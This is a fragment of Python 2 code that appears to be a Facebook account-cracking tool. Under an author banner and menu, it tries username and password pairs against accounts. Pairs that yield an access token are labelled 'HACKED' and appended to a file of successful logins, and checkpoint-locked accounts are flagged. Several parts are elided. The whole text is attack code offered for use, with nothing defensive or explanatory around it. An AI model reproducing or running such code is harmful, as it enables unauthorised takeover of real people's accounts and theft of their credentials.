...
def menu():
    ...
    print logo
    print ''
    print 'AUTHOR   : Liton Vau'
    print 'FACEBOOK : facebook.com/litonvau009'
    print 'GITHUB   : github.com/botolliton'
    print 'FB PAGE  :  https://www.facebook.com/Kostepathor009'
    print 50* '-'
    print '[1]  \x1b[1;96mGP'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Botol_Liton-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[Botol_Liton-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 03 Days]\x1b[0m \n'
